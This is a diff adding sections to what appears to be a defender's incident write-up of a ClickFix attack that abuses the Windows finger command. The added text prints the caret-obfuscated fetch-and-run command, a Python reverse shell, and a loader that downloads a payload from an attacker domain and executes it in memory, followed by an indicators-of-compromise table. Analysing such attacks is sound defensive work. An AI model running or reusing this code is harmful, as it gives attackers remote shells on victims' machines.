@@ -36,8 +36,57 @@ Curl is a known LotLbin, however this I had not seen just quite yet. The attacke
 
 To bypass simple string based detections the attackers used the method of character escape using carets (^) surrounding the letters the command looked like this `f^^i^^n^^g^^e^^r`. The full command is below. 
 ```bash
-f^^i^^n^^g^^e^^r cmd /K for /f "skip=14 delims=" %h in ('finger ...') do call %h
+cmd.exe /k s^t^a^r^t "" /min for /f "skip=14 delims=" %h in ('f^^i^^n^^g^^e^^r rgWnFMVDZL@f^^i^^n^^g^^e^^r^^.^^linked-people.com') do call %h & exit && echo ' ---Verify you are human--------press ENTER--- '
 ```
+
+Following this the threat actor downloaded and extracted python for windows and extracted using the following command 
+
+```powershell
+tar.exe -xf "C:\Users\%VICTIM_USER%\AppData\Local\python-3.15.0a1-embed-win32.pdf" -C "C:\Users\%VICTIM_USER%\AppData\Local\python-3.15.0a1-embed-win32"
+```
+
+After extracting the threat actor moved to utilizing python to install malicious RMM software (screenconnect)
+
+Python 2556773726507.exe
+```python
+import os, socket, subprocess
+
+# The attacker's connection details
+ip = "192.168.1.105"
+port = 4444
+
+# Creates a connection to the attacker
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+
+# Redirects your computer's terminal input/output to the attacker
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+# Launches a command prompt shell for the attacker
+p = subprocess.call(["/bin/sh", "-i"])
+```
+
+Sub Process of that script 
+```python
+import ssl
+import time
+import urllib.request
+
+# 1. Disable Certificate Verification
+ssl._create_default_https_context = ssl._create_unverified_context
+
+# 2. Download the Payload
+c = urllib.request.urlopen('https://dapala.net/.../scr3').read().decode('utf-8')
+
+# 3. Brief Delay
+time.sleep(2.1)
+
+# 4. Execute in Memory
+exec(c)
+```
+This was decoded from a b64 and utf decoded blob.. **Hmm interesting** I thought it was weird that there were some very AI looking comments in our decoded blob... Gotta love AI lol.
 
 ---
 
@@ -84,3 +133,17 @@ My Takeaway / What I want you to take away
 This incident highlights a critical shift in adversarial behavior. When attackers trick users into running malicious commands using clickfix techniques we need to analyze what commands they're actually running. 
 
 In this case it was `finger` up until this attack I was unfamiliar with the command at all. We need to be on the lookout for any strange connections beaconing home, and the abuse of escape characters utilizing built in tools to do malicious procedures. Security teams must monitor for anamalous usage of built in binaries and aggressively audit the presence of unauthorized RMM software.
+
+
+## IoC dump
+
+| **Category**       | **Indicator**                                                                                                                                                                                                    |
+| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Domains**        | `linked-people.com`, `dapala.net`, `thelinkesisthebest.it.com`                                                                                                                                                   |
+| **Relay IPs**      | `15.204.43.236`, `139.178.91.96`                                                                                                                                                                                 |
+| **Internal IP**    | `192.168.1.105` (Attacker pivot/Internal listener)                                                                                                                                                               |
+| **Filenames**      | `scr3` (Python payload), `modes.py` (Reverse shell), `user.config` (ScreenConnect)                                                                                                                               |
+| **Procs**          | `Mobsync.exe`, `SearchHost.exe` (Used as parents for malicious threads)                                                                                                                                          |
+| **Initial Access** | `cmd.exe /k s^t^a^r^t "" /min for /f "skip=14 delims=" %h in ('f^^i^^n^^g^^e^^r rgWnFMVDZL@f^^i^^n^^g^^e^^r^^.^^linked-people.com') do call %h & exit && echo ' ---Verify you are human--------press ENTER--- '` |
+
+
